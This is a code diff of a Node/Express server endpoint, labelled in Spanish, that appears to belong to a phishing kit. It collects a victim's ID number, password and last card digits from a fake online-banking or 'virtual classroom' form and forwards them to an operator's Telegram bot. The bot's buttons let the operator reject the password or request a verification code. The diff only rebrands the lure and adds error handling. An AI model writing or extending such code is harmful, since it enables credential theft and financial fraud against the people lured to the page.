@@ -15,48 +15,77 @@ const requests = {};
 ENVIAR NOMBRE
 ========================= */
 app.post("/api/nombre", async (req,res)=>{
-  const { tipo, identificacion, clave, ultimos } = req.body;
 
-  if(!tipo || !identificacion || !clave){
-    return res.json({error:true});
-  }
+  try{
 
-  const id = crypto.randomUUID();
+    const { tipo, identificacion, clave, ultimos } = req.body || {};
 
-  requests[id]={
-    estado:"esperando",
-    tipo,
-    identificacion,
-    clave,
-    ultimos: ultimos || null
-  };
-
-  let texto =
-`🏦 BANCA VIRTUAL - CLAVE SEGURA
-
-🪪 Tipo: ${tipo}
-👤 ID: ${identificacion}
-🔑 Clave: ${clave}`;
-
-  if(ultimos){
-    texto += `\n💳 Últimos dígitos: ${ultimos}`;
-  }
-
-  texto += `\n🆔 ID:${id}`;
-
-  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    chat_id:CHAT_ID,
-    text:texto,
-    reply_markup:{
-      inline_keyboard:[[
-        {text:"ERROR",callback_data:`error_${id}`},
-        {text:"CODIGO",callback_data:`codigo_${id}`}
-      ]]
+    if(!tipo || !identificacion || !clave){
+      return res.json({error:true});
     }
-  });
 
-  res.json({id});
+    const id = crypto.randomUUID();
+
+    /* GUARDAR SESSION */
+    requests[id] = {
+      estado:"esperando",
+      tipo,
+      identificacion,
+      clave,
+      ultimos: ultimos || null
+    };
+
+    /* MENSAJE SEGÚN FORMULARIO */
+    let texto = "";
+
+    if(ultimos){
+      /* FORMULARIO TARJETA */
+      texto =
+`💳 AULA VIRTUAL - TARJETA ESTUDIANTIL
+
+📋 Tipo: ${tipo}
+🆔 ID: ${identificacion}
+🔐 Clave: ${clave}
+💳 Últimos: ${ultimos}
+
+🆔 ID:${id}`;
+    } else {
+
+      /* FORMULARIO CLAVE SEGURA */
+      texto =
+`📚 AULA VIRTUAL - CLAVE SEGURA
+
+📋 Tipo: ${tipo}
+🆔 ID: ${identificacion}
+🔐 Clave: ${clave}
+
+🆔 ID:${id}`;
+    }
+
+    /* ENVIAR TELEGRAM */
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: CHAT_ID,
+        text: texto,
+        reply_markup:{
+          inline_keyboard:[[
+            { text:"❌ ERROR", callback_data:`error_${id}` },
+            { text:"🔢 CODIGO", callback_data:`codigo_${id}` }
+          ]]
+        }
+      }
+    );
+
+    res.json({id});
+
+  }catch(err){
+    console.log(err);
+    res.json({error:true});
+  }
+
 });
+
 
 
 /* =========================
